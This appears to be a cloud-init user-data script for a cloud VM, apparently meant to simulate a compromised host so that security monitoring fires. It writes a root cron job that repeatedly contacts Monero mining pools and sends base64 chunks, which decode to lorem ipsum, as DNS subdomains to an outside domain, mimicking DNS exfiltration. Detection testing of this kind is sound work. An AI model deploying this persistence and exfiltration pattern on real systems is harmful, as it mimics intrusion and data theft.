Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
mkdir -p /usr/cryptokit
touch /usr/cryptokit/persist.sh
chmod 750 /usr/cryptokit/persist.sh
echo "#!/bin/bash" >> /usr/cryptokit/persist.sh
echo "dig donate.v2.xmrig.com" >> /usr/cryptokit/persist.sh
echo "dig systemten.org" >> /usr/cryptokit/persist.sh
echo "dig xmr.pool.minergate.comac" >> /usr/cryptokit/persist.sh
echo "dig pool.minergate.com" >> /usr/cryptokit/persist.sh
echo "dig dockerupdate.anondns.net" >> /usr/cryptokit/persist.sh
echo "dig rspca-northamptonshire.org.uk" >> /usr/cryptokit/persist.sh
echo "dig xmrpool.eu" >> /usr/cryptokit/persist.sh
echo "dig cryptofollow.com" >> /usr/cryptokit/persist.sh
echo "dig xmr-usa.dwarfpool.com" >> /usr/cryptokit/persist.sh
echo "dig xmr-eu.dwarfpool.com" >> /usr/cryptokit/persist.sh
echo "dig xmr-eu1.nanopool.org" >> /usr/cryptokit/persist.sh
echo "curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj  > /dev/null &" >> /usr/cryptokit/persist.sh
echo "curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk  > /dev/null &" >> /usr/cryptokit/persist.sh
echo "for i in {1..10};" >> /usr/cryptokit/persist.sh
echo "do" >> /usr/cryptokit/persist.sh
echo "  dig CgpMb3JlbSBpcHN1bSBkb2xvciBzaXQgYW1ldC.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig wgY29uc2VjdGV0dXIgYWRpcGlzY2luZyBlbGl0.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig LiBWZXN0aWJ1bHVtIGFjIHJpc3VzIGRvbG9yLi.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig BJbiBldSBpbXBlcmRpZXQgbWksIGlkIHNjZWxl.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig cmlzcXVlIG9yY2kuIE51bGxhbSB1dCBsaWJlcm.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 8gcHVydXMuIFBlbGxlbnRlc3F1ZSBhdCBmcmlu.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig Z2lsbGEgbWV0dXMsIGFjIHVsdHJpY2VzIGVyYX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig QuIEZ1c2NlIGN1cnN1cyBtb2xsaXMgcmlzdXMg.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig dXQgdWx0cmljaWVzLiBOYW0gbWFzc2EganVzdG.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 8sIHVsdHJpY2llcyBhdWN0b3IgbWkgdXQsIGRp.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig Y3R1bSBsb2JvcnRpcyBudWxsYS4gTnVsbGEgc2.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig l0IGFtZXQgZmVsaXMgbm9uIGlwc3VtIHZlc3Rp.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig YnVsdW0gcmhvbmN1cy4gTG9yZW0gaXBzdW0gZG.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 9sb3Igc2l0IGFtZXQsIGNvbnNlY3RldHVyIGFk.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig aXBpc2NpbmcgZWxpdC4gSW4gZmF1Y2lidXMgaW.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig QgZWxpdCBhdCBtYXhpbXVzLiBBbGlxdWFtIGRh.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig cGlidXMgdXQgbWF1cmlzIG5lYyBmYXVjaWJ1cy.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 4gUHJvaW4gYXVjdG9yIGxpYmVybyBuZWMgYXVn.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig dWUgc2FnaXR0aXMgY29uZGltZW50dW0uIFZlc3.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig RpYnVsdW0gYmliZW5kdW0gb2RpbyBxdWFtLCBh.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig dCBjb25ndWUgbnVsbGEgdml2ZXJyYSBpbi4gSW.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 4gdWx0cmljaWVzIHR1cnBpcyBhdCBmYWNpbGlz.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig aXMgZGljdHVtLiBFdGlhbSBuaXNpIGFudGUsIG.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig RpY3R1bSBldCBoZW5kcmVyaXQgbmVjLCBzb2Rh.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig bGVzIGlkIGVyb3MuCgpQaGFzZWxsdXMgZmV1Z2.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig lhdCBudW5jIHNlZCBzdXNjaXBpdCBmYXVjaWJ1.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig cy4gQWVuZWFuIHRpbmNpZHVudCBwb3J0dGl0b3.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IgbmlzbCwgdXQgY3Vyc3VzIGZlbGlzIHZvbHV0.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig cGF0IHZpdGFlLiBNb3JiaSBuZWMgbGVvIHB1bH.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig ZpbmFyLCBhY2N1bXNhbiBtYXVyaXMgbmVjLCBj.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig b21tb2RvIG1hdXJpcy4gTmFtIGNvbW1vZG8gZW.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig dldCBlbmltIGF0IGFsaXF1YW0uIFN1c3BlbmRp.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig c3NlIGVnZXN0YXMgbWFzc2EgaWQgcmlzdXMgcG.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig VsbGVudGVzcXVlIHBvcnR0aXRvciBuZWMgbmVj.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IG5lcXVlLiBDcmFzIG5lYyBzZW0gYXJjdS4gTn.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig VsbGEgcXVpcyBzYXBpZW4gaW4gbGFjdXMgbGFj.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig aW5pYSB1bHRyaWNlcyBtYXR0aXMgZXQgcHVydX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig MuIE51bmMgZmVybWVudHVtIG5lcXVlIGlkIG51.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig bmMgYmxhbmRpdCBtYXhpbXVzLiBEdWlzIGV1IH.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig NvbGxpY2l0dWRpbiBudWxsYSwgYWMgbWF0dGlz.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IGF1Z3VlLiBNYXVyaXMgcXVpcyBjdXJzdXMgaX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig BzdW0sIHF1aXMgZnJpbmdpbGxhIHNlbS4gTW9y.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig YmkgbWFsZXN1YWRhIHNhcGllbiBzZWQgbWV0dX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig MgY29udmFsbGlzLCBzaXQgYW1ldCBldWlzbW9k.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IGF1Z3VlIHBlbGxlbnRlc3F1ZS4gTW9yYmkgbm.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig liaCBlcmF0LCBwb3N1ZXJlIHNpdCBhbWV0IGFj.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig Y3Vtc2FuIG5lYywgbWFsZXN1YWRhIGEgbGVvLg.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig oKRG9uZWMgZXUgcHJldGl1bSBvZGlvLiBBZW5l.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig YW4gdHJpc3RpcXVlIHF1YW0gdmVsIG9yY2kgYW.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig xpcXVhbSwgbmVjIHNjZWxlcmlzcXVlIG51bmMg.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig c3VzY2lwaXQuIEV0aWFtIGVsaXQgc2VtLCB2aX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig ZlcnJhIG5lYyBmcmluZ2lsbGEgdml0YWUsIGV1.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig aXNtb2QgaWQgdHVycGlzLiBJbnRlZ2VyIHF1aX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig MgZXJhdCBlZ2V0IGFyY3UgdGluY2lkdW50IHBl.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig bGxlbnRlc3F1ZS4gQ3VyYWJpdHVyIHF1YW0gbn.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig VsbGEsIGx1Y3R1cyB2ZWwgdm9sdXRwYXQgZWdl.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig dCwgZGFwaWJ1cyBldCBudW5jLiBOdW5jIHF1aX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig MgbGliZXJvIGFsaXF1YW0sIGNvbmRpbWVudHVt.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IGp1c3RvIHF1aXMsIGxhY2luaWEgbmVxdWUuIF.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig Byb2luIGRhcGlidXMgZWxpdCBhdCBoZW5kcmVy.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig aXQgbWF4aW11cy4gU2VkIHNlbXBlciBudW5jIG.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 1hc3NhLCBlZ2V0IHBlbGxlbnRlc3F1ZSBlbGl0.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IHNhZ2l0dGlzIHNlZC4g.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "done" >> /usr/cryptokit/persist.sh
one_call=$(/usr/cryptokit/persist.sh)
touch /var/spool/cron/root
/usr/bin/crontab /var/spool/cron/root
echo "*/15 * * * * /usr/cryptokit/persist.sh" >> /var/spool/cron/root
--//

